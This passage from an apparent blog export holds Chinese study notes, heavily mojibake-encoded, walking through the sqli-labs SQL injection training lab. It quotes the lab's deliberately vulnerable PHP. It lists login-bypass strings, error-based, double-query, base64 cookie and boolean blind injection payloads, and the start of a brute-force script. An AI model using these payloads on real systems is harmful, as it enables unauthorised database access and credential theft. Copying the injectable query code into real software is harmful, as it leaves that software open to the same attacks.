/&gt;&apos;; } echo &apos;&lt;center&gt;&apos;; echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;; echo &apos;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&apos;; echo &apos;&lt;/form&gt;&apos;; echo &apos;&lt;/center&gt;&apos;; } else { echo &apos;&lt;center&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&apos;; echo &quot; Your Cookie is deleted&quot;; setcookie(&apos;uname&apos;, $row1[&apos;username&apos;], time()-3600); header (&apos;Location: index.php&apos;); echo &apos;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&apos;; } echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; //header (&apos;Location: main.php&apos;); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; //echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&apos;; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;Cookie:&apos;.$cookee.&quot;\n&quot;); fclose($fp); } ?&gt; åˆ†æž1ã€åˆ¤æ–­cookieæ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™è¿›è¡Œç™»å…¥éªŒè¯ 2ã€ç™»å…¥æ—¶å¯¹uname,passwdå…ˆè¿›è¡Œè¿‡æ»¤ï¼Œè¿‡æ»¤åŽéªŒè¯æ˜¯å¦æ­£ç¡®ï¼Œå°†å˜é‡cookieèµ‹å€¼ä¸ºusernameï¼Œè®¾ç½®cookieä¸ºuname+time()+3600 3ã€æ²¡ç‚¹å‡»submitæŒ‰é’®ï¼Œåˆ™æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬user agentã€IPã€cookie,æŸ¥è¯¢å¯¹åº”cookieçš„è´¦å·å¯†ç å¹¶æ˜¾ç¤º 4ã€è‹¥ç‚¹å‡»äº†submitæŒ‰é’®ï¼Œé‡ç½®cookieï¼Œå¹¶é‡å®šå‘åˆ°ç™»å…¥é¡µé¢ å…³é”®ä»£ç ï¼Œå¯¹cookieå¯¹åº”çš„ç”¨æˆ·è¿›è¡Œäº†æŸ¥è¯¢ï¼Œä¸”å˜é‡$cookeeå¹¶æœªè¿›è¡Œè¿‡æ»¤ï¼Œè€Œè¯¥å˜é‡çš„å€¼æ˜¯ç”±usernameä¼ é€’è€Œæ¥ $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;; payloadæ·»åŠ å•å¼•å·æµ‹è¯• Cookie: uname=admin&apos; è¿”å›žï¼šnear &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1ç”±å•å¼•å·åŒ…è£¹ admin&apos;or 1=1# è¿”å›žæ­£å¸¸ éåŽ†æ•°æ®åº“å admin&apos;or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1)# XPATH syntax error: &apos;+information_schema+&apos; å…¶ä»–åŒä¸Š Less-21 Cookie Injection- Error Based- complex - stringLess-21ä¸ŽLess-20çš„ä¸åŒä¹‹å¤„åœ¨äºŽcookieå¯¹unameè¿›è¡Œäº†bse64ç¼–ç  setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600); æµ‹è¯•uname=admin&apos;ç»è¿‡base64ç¼–ç åŽ uname=YWRtaW4n near &apos;&apos;admin&apos;&apos;) LIMIT 0,1&apos; at line 1 å¯ä»¥çœ‹åˆ°ç”±å•å¼•å·å’Œæ‹¬å·åŒ…è£¹ admin&apos; or 1=1)# YWRtaW4nIG9yIDE9MSkjè¿”å›žæ­£å¸¸ æž„é€ payloadéåŽ†ç³»ç»Ÿæ•°æ®åº“å admin&apos; or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1))# YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDJiLChzZWxlY3Qgc2NoZW1hX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEgbGltaXQgMCwxKSwweDJiKSwxKSkj è¿”å›žXPATH syntax error: &apos;+information_schema+&apos; å…¶ä»–åŒä¸Š Less-22 Cookie Injection- Error Based- Double Quotes - stringæµ‹è¯•uname=admin&apos; uname=YWRtaW4n æœªæŠ¥é”™ admin&quot; YWRtaW4i near &apos;&quot;admin&quot;&quot; LIMIT 0,1&apos; at line 1 ç”±åŒå¼•å·åŒ…è£¹ admin&quot; or 1=1# YWRtaW4iIG9yIDE9MSM=è¿”å›žæ­£å¸¸ æž„é€ payloadadmin&quot; or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1)# YWRtaW4iIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDJiLChzZWxlY3Qgc2NoZW1hX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEgbGltaXQgMCwxKSwweDJiKSwxKSM= XPATH syntax error: &apos;+information_schema+&apos; å…¶ä»–åŒä¸Š å‚è€ƒ SQLi-Labs å­¦ä¹ ç¬”è®°]]></content>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-11-16]]></title>
    <url>%2F2018%2F04%2F23%2Fsqli-labs-Less-11-16%2F</url>
    <content type="text"><![CDATA[Less-11 POST - Error Based - Single quotes - StringåŸºäºŽæŠ¥é”™çš„å•å¼•å·å­—ç¬¦æ³¨å…¥å¦‚ä½•ç»•è¿‡èº«ä»½éªŒè¯ç™»å…¥è¿›åŽ»ï¼Ÿä¸‡èƒ½å¯†ç ç™»å…¥å¸¸ç”¨ä¸‡èƒ½å¯†ç  aspã€aspx 1: &quot;or &quot;a&quot;=&quot;a 2ï¼š &apos;)or(&apos;a&apos;=&apos;a 3ï¼šor 1=1-- 4ï¼š&apos;or 1=1-- 5ï¼ša&apos;or&apos; 1=1-- 6ï¼š &quot;or 1=1-- 7ï¼š&apos;or&apos;a&apos;=&apos;a 8ï¼š &quot;or&quot;=&quot;a&apos;=&apos;a 9ï¼š&apos;or&apos;&apos;=&apos; 10ï¼š&apos;or&apos;=&apos;or&apos; 11: 1 or &apos;1&apos;=&apos;1&apos;=1 12: 1 or &apos;1&apos;=&apos;1&apos; or 1=1 13: &apos;OR 1=1%00 14: &quot;or 1=1%00 15: &apos;xor 16: æ–°åž‹ä¸‡èƒ½ç™»é™†å¯†ç  ç”¨æˆ·å &apos; UNION Select 1,1,1 FROM admin Where &apos;&apos;=&apos; ï¼ˆæ›¿æ¢è¡¨åadminï¼‰ å¯†ç  1 Username=-1%cf&apos; union select 1,1,1 as password,1,1,1 %23 Password=1 17..admin&apos; or &apos;a&apos;=&apos;a å¯†ç éšä¾¿ PHPä¸‡èƒ½å¯†ç  &apos;or&apos;=&apos;or&apos; &apos;or 1=1/* å­—ç¬¦åž‹ GPCæ˜¯å¦å¼€éƒ½å¯ä»¥ä½¿ç”¨ User: something Pass: &apos; OR &apos;1&apos;=&apos;1 jsp ä¸‡èƒ½å¯†ç  1&apos;or&apos;1&apos;=&apos;1 admin&apos; OR 1=1/* ç”¨æˆ·åï¼šadmin ç³»ç»Ÿå­˜åœ¨è¿™ä¸ªç”¨æˆ·çš„æ—¶å€™ æ‰ç”¨å¾—ä¸Š å¯†ç ï¼š1&apos;or&apos;1&apos;=&apos;1 payloadï¼ˆ1ï¼‰ä¸‡èƒ½å¯†ç åœ¨passwdå­—æ®µåŽé¢æž„é€ ä¸‡èƒ½å¯†ç +é—­åˆå•å¼•å· uname=admin&amp;passwd=1&apos; or &apos;1&apos;=&apos;1&amp;submit=Submit è¿”å›ž Your Login name:Dumb Your Password:Dumb åœ¨unameå­—æ®µåŽé¢æž„é€ ä¸‡èƒ½å¯†ç +é—­åˆå•å¼•å· uname=admin&apos; or &apos;1&apos;=&apos;1&amp;passwd=1&amp;submit=Submit è¿”å›ž Your Login name:admin Your Password:admin æˆ‘ä»¬å‘çŽ°ä¸¤è€…è¿”å›žçš„è´¦æˆ·å¯†ç ä¸ä¸€æ ·ï¼ŒæŸ¥çœ‹æºä»£ç  &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in\n\n &quot; ; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; sqlè¯­å¥å¦‚ä¸‹ï¼š SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1 æƒ…å†µä¸€ï¼š SELECT username, password FROM users WHERE username=&apos;admin&apos; and password=&apos;1&apos; or &apos;1&apos;=&apos;1&apos; LIMIT 0,1 æƒ…å†µäºŒï¼š SELECT username, password FROM users WHERE username=&apos;admin&apos; or &apos;1&apos;=&apos;1&apos; and password=&apos;1&apos; LIMIT 0,1 and ä¼˜å…ˆçº§é«˜ï¼Œæ‰€ä»¥æƒ…å†µä¸€å‰é¢ä¸ºFalseï¼Œä½†æ˜¯ä¸ŽTrueæˆ–è¿ç®—ä¸ºtrueï¼Œè¿”å›žäº†ç¬¬ä¸€ä¸ªè´¦å·å’Œå¯†ç ï¼›æƒ…å†µäºŒåŽé¢ä¸ºFalseï¼Œä½†å­˜åœ¨adminè¿™ä¸ªè´¦æˆ·ï¼Œæˆ–è¿ç®—ä¸ºTrueï¼Œè¿”å›žäº†adminè´¦å·çš„è´¦å·å’Œå¯†ç  ï¼ˆ2ï¼‰è”åˆæŸ¥è¯¢uname=test &amp;passwd=test&apos; order by 3%23 è¿”å›žé”™è¯¯ uname=test &amp;passwd=test&apos; order by 2%23 è¿”å›žæ­£ç¡® uname=test &amp;passwd=test&apos; union select 1,2 %23 è¿”å›žï¼šYour Login name:1 Your Password:2 å‰©ä¸‹çš„æ³¨å…¥æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯ä¸Žä¹‹å‰getç±»ä¼¼ Less-12 POST - Error Based - Double quotes - String -with twiståŸºäºŽæŠ¥é”™çš„åŒå¼•å·å¸¦æ‹¬å·çš„å­—ç¬¦æ³¨å…¥ä¸ŽLess-11ç±»ä¼¼ payload1ã€ç›´æŽ¥æ³¨é‡Š uname=admin &amp;passwd=1&quot;) or &quot;1&quot;=&quot;1&quot; %23 2ã€é—­åˆç»•è¿‡ uname=admin &amp;passwd=1&quot;) or (&quot;1&quot;=&quot;1 uname=admin&quot;) or( &quot;1&quot;=&quot;1 &amp;passwd=1 è”åˆæŸ¥è¯¢ uname=test &amp;passwd=test&quot;) order by 3 %23è¿”å›žé”™è¯¯ uname=test &amp;passwd=test&quot;) order by 2 %23è¿”å›žæ­£ç¡® uname=test &amp;passwd=test&quot;) union select 1,2 %23 è¿”å›žï¼š Your Login name:1 Your Password:2 åŒä¸Š Less-13 POST-Double Injection-Single quotes-String -with twistæµ‹è¯•åŠ å•å¼•å· uname=test &amp;passwd=test&apos; æŠ¥é”™å¦‚ä¸‹ &apos;&apos;test&apos;&apos;) LIMIT 0,1&apos; å¯çŸ¥æ˜¯å•å¼•å·å’Œæ‹¬å·åŒ…è£¹å˜é‡ uname=test &amp;passwd=test&apos;) %23è¿”å›žæ­£å¸¸ uname=test &amp;passwd=test&apos;) or 1=1%23 æ˜¾ç¤ºsuccessfully loggend in æºä»£ç å¦‚ä¸‹ï¼š &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in &quot; ; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; //echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; //echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; ç™»å…¥æˆåŠŸè¿”å›žçš„æ˜¯flag.jpgå›¾ç‰‡ï¼Œå›¾ç‰‡æ˜¾ç¤ºsuccessfully logined inï¼›å¤±è´¥æ˜¯slap.jpgçš„å›¾ç‰‡ã€‚ä¸ä¼šæ˜¾ç¤ºç™»å…¥çš„è´¦å·å’Œå¯†ç ä¿¡æ¯ payloadä¸‡èƒ½å¯†ç ç™»å…¥uname=test &amp;passwd=test&apos;) or 1=1%23 åŒæ³¨å…¥æŸ¥è¯¢åŽŸç†å‚è€ƒLess-5 uname=test &amp;passwd=test&apos;) or 1=1 order by 3 %23è¿”å›žé”™è¯¯ uname=test &amp;passwd=test&apos;) or 1=1 order by 2 %23è¿”å›žæ­£å¸¸ uname=test &amp;passwd=test&apos;) or 1=1 union select 1,2 %23è¿”å›žæˆåŠŸä½†æ˜¯æ²¡æœ‰æ˜¾ç¤ºä½ ä½¿ç”¨åŒæŸ¥è¯¢æ³¨å…¥æ–¹å¼ uname=test &amp;passwd=test&apos;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23 è¿”å›ž Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos; å‰©ä¸‹çš„å‚è€ƒLess-5 Less-14 POST-Double Injection-Double quotes-String-with twistæµ‹è¯•å•å¼•å· uname=test &amp;passwd=test&apos; or 1=1 %23è¿”å›žå¤±è´¥å›¾ç‰‡ åŒå¼•å· uname=test &amp;passwd=test&quot;or 1=1 %23 è¿”å›žæˆåŠŸå›¾ç‰‡ å‚æ•°æ˜¯ç”±åŒå¼•å·åŒ…è£¹ æºä»£ç  $uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;; $passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; @$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;; æ³¨æ„ç‚¹å·æ˜¯èµ·è¿žæŽ¥ä½œç”¨ï¼Œå°†å˜é‡ä¸€å‰ä¸€åŽåˆ†åˆ«è¿žæŽ¥ä¸€ä¸ªåŒå¼•å·è¿™é‡Œè°ƒè¯•ç›´æŽ¥echoå‡ºå˜é‡å¯ä»¥çœ‹åˆ° uname=uname &amp;passwd=passwd è¾“å‡ºï¼š&quot;uname &quot;&quot;passwd&quot; å¯ä»¥çœ‹åˆ°æ˜¯å•å¼•å·åŒ…è£¹ç€ æµ‹è¯•å­—æ®µæ•° uname=uname &amp;passwd=passwd&quot; or 1=1 order by 2 %23 å‰©ä¸‹çš„ä¸ŽLess-13ç›¸ä¼¼ Less-15 POST-Blind-Boolian/time Based-Single quotesåŸºäºŽå¸ƒå°”åž‹æˆ–æ—¶é—´çš„å•å¼•å·postç›²æ³¨æµ‹è¯•åœ¨åŽé¢æ·»åŠ å•å¼•å·ã€åŒå¼•å·ã€æ‹¬å·ç­‰æ— ä»»ä½•é”™è¯¯æ˜¾ç¤ºï¼Œåªæ˜¾ç¤ºä¸€ä¸ªé”™è¯¯çš„å›¾ç‰‡ï¼Œé”™è¯¯å›žæ˜¾åº”è¯¥æ˜¯è¢«æ³¨é‡Šäº†ã€‚ uname=uname &amp;passwd=passwd&apos; or 1=1 %23è¿”å›žæ­£ç¡® å­—æ®µæ•° uname=uname &amp;passwd=passwd&apos; or 1=1 order by 2 %23 æ˜¾ç¤ºä½ uname=uname &amp;passwd=passwd&apos; or 1=1 union select 1,2 %23æ‰§è¡ŒæˆåŠŸæ²¡æœ‰å›žæ˜¾ ä½¿ç”¨åŒæŸ¥è¯¢è¾“å…¥ uname=test &amp;passwd=test&apos; or 1=1 union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23 è¿”å›žæˆåŠŸä½†å¹¶æ²¡æœ‰æŠ¥é”™æ˜¾ç¤ºæˆ‘ä»¬æƒ³è¦çš„æ•°æ® ä¸ºä»€ä¹ˆLess13-14ä¸­ä½¿ç”¨åŒæŸ¥è¯¢è¾“å…¥æœ‰æ•ˆè€Œåœ¨è¿™é‡Œä¸è¡Œï¼ŸLess-15æºä»£ç  &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in\n\n &quot; ; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; //print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; æŸ¥çœ‹å¯¹æ¯”ä¸¤è€…çš„æºä»£ç å¯ä»¥å‘çŽ°åœ¨æœ¬å…³ä¸­print_r(mysql_error());å‡½æ•°è¢«æ³¨é‡Šäº† payloadè¿™é‡Œä½¿ç”¨å¸ƒå°”åž‹ç›²æ³¨ uname=test &amp;passwd=test&apos; or length((select database())) =8 %23 è¿”å›žæ­£ç¡® å‰©ä¸‹å‚è€ƒLess-8 Less-16 POST-Blind-Boolian/Time Based-Double quotesåŸºäºŽå¸ƒå°”åž‹æˆ–æ—¶é—´çš„åŒå¼•å·postç›²æ³¨æµ‹è¯•uname=test &amp;passwd=test &apos; or 1=1 %23è¿”å›žé”™è¯¯ uname=test &amp;passwd=test&apos;) or 1=1 %23è¿”å›žé”™è¯¯ uname=test &amp;passwd=test &quot; or 1=1 %23è¿”å›žé”™è¯¯ uname=test &amp;passwd=test&quot;) or 1=1 %23è¿”å›žæ­£ç¡® payloadå­—æ®µæ•° uname=test &amp;passwd=test &quot;) or 1=1 order by 2%23è¿”å›žæ­£ç¡® uname=test &amp;passwd=test &quot;) or 1=1 order by 3%23è¿”å›žé”™è¯¯ å‰©ä¸‹å‚è€ƒLess-15]]></content>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-8-10]]></title>
    <url>%2F2018%2F04%2F22%2Fsqli-labs-Less-8-10%2F</url>
    <content type="text"><![CDATA[Less-8 GET-Blind-Boolian Based - Single Quoteså¸ƒå°”åž‹å•å¼•å·GETç›²æ³¨ç›²æ³¨å½“ä¸èƒ½é€šè¿‡ç›´æŽ¥æ˜¾ç¤ºæ¥èŽ·å–æ•°æ®åº“æ•°æ®æ—¶ï¼Œä½¿ç”¨ç›²æ³¨çš„æ–¹å¼ï¼Œæ ¹æ®å…¶è¿”å›žé¡µé¢çš„ä¸åŒæ¥åˆ¤æ–­ä¿¡æ¯(é¡µé¢å†…å®¹ä¸åŒï¼Œå“åº”æ—¶é—´)ï¼›ä¸€èˆ¬åˆ†ä¸ºå¸ƒå°”åž‹ç›²æ³¨ï¼Œæ—¶é—´æ€§ç›²æ³¨ï¼ŒæŠ¥é”™ç›²æ³¨ã€‚ ç›²æ³¨å¸¸ç”¨å‡½æ•° å‡½æ•° åŠŸèƒ½ length(str) è¿”å›žstrå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ substr(str, pos, len) å°†strä»Žposä½ç½®å¼€å§‹æˆªå–lené•¿åº¦çš„å­—ç¬¦è¿›è¡Œè¿”å›žã€‚æ³¨æ„è¿™é‡Œçš„posä½ç½®æ˜¯ä»Ž1å¼€å§‹çš„ï¼Œä¸æ˜¯æ•°ç»„çš„0å¼€å§‹ mid(str,pos,len) è·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œæˆªå–å­—ç¬¦ä¸² ascii(str) è¿”å›žå­—ç¬¦ä¸²strçš„æœ€å·¦é¢å­—ç¬¦çš„ASCIIä»£ç å€¼ã€‚ ord(str) åŒä¸Šï¼Œè¿”å›žasciiç  if(a,b,c) aä¸ºæ¡ä»¶ï¼Œaä¸ºtrueï¼Œè¿”å›žbï¼Œå¦åˆ™è¿”å›žcï¼Œå¦‚if(1&gt;2,1,0),è¿”å›ž0 select database() æŸ¥è¯¢æ•°æ®åº“ ascii(substr((select database()),1,1)) è¿”å›žæ•°æ®åº“åç§°çš„ç¬¬ä¸€ä¸ªå­—æ¯,è½¬åŒ–ä¸ºasciiç  ascii(substr((select database()),1,1))&gt;64 asciiå¤§äºŽ64å°±è¿”å›žtrueï¼Œifå°±è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0 å¸¸è§çš„ASCIIï¼ŒA:65,Z:90 a:97,z:122, 0:48, 9:57 å¸ƒå°”åž‹ç›²æ³¨ç›²æ³¨å›ºå®šå¼:and ascii(substr(A,1,1))&gt;B and if(ascii(substr(A,1,1))&gt;B,1,0) A é€šè¿‡æ˜¯ä¸€ä¸ªselectè¯­å¥ï¼ŒBåˆ™æ˜¯å­—ç¬¦ä¸²æˆ–æ•°å­—çš„asciiç ï¼Œä¸­å¿ƒæ€æƒ³æ˜¯é€šè¿‡substrç­‰æˆªå–å‡½æ•°ä»¥äºŒåˆ†æ³•çš„å½¢å¼é€ä¸ªæŸ¥è¯¢åŒ¹é…æƒ³è¦çš„ä¿¡æ¯ï¼Œè¿‡ç¨‹è€—æ—¶ç¹çã€‚ payloadæºä»£åˆ†æž &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_GET[&apos;id&apos;])) { $id=$_GET[&apos;id&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;); fclose($fp); // connectivity $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; //echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} ?&gt; å‚æ•°idæ˜¯ç”±å•å¼•å·åŒ…è£¹ï¼ŒæŠ¥é”™æ˜¾ç¤ºå‡½æ•°è¢«æ³¨é‡ŠæŽ‰äº†ï¼Œä¹‹å‰çš„åŒæŸ¥è¯¢æ³¨å…¥æ–¹æ³•ä¸é€‚ç”¨ æ­£ç¡®æ—¶è¿”å›ž Welcome Dhakkan You are in...... é”™è¯¯æ—¶è¿”å›ž Welcome Dhakkan æ³¨å…¥æ–¹æ³•sqli-labs/Less-8/?id=1 è¿”å›žæ­£å¸¸ sqli-labs/Less-8/?id=1&apos; è¿”å›žé”™è¯¯ sqli-labs/Less-8/?id=1&apos;%23 è¿”å›žæ­£å¸¸ï¼Œå¯çŸ¥æ˜¯å•å¼•å·é—­åˆ çŒœè§£ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ•°æ®åº“å sqli-labs/Less-8/?id=1&apos; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)) = 105%23 è¿™é‡ŒçŒœåˆ°äº†å­—æ¯ i æŸ¥è¯¢å½“å‰æ•°æ®åº“åé•¿åº¦ sqli-labs/Less-8/?id=1&apos; and length((select database())) =8 %23 é•¿åº¦ä¸º 8 æŸ¥è¯¢æ•°æ®åº“å sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1)) &gt; 50 %23 è¿”å›žæ­£å¸¸ sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1)) =115 %23 é€šè¿‡äºŒåˆ†æ³•ç¡®å®šäº†æ•°æ®åº“åçš„é¦–å­—æ¯çš„asciiç å€¼ä¸º115ï¼ˆsï¼‰ çŒœè§£securityæ•°æ®åº“ä¸­çš„è¡¨å sqli-labs/Less-8/?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema =&apos;security&apos; limit 1,1),1,1)) = 114 %23 çŒœè§£usersè¡¨ä¸­çš„åˆ—å sqli-labs/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name =&apos;users&apos; limit 1,1),1,1)) =117 %23 pythonçˆ†ç ´å°è„šæœ¬#!/usr/bin/python #-*-encoding:utf-8-*- import requests import re url = &apos;http://xxx.xxx.xxx.xxx/&apos; #èŽ·å–æ•°æ®é•¿åº¦ def getDataLen(url,payload,min,max): num_min = min num_max = max while min &lt; max: num_mid = (num_min + num_max) /2 #print num_min,num_mid,num_max if (num_max == num_mid) or (num_min == 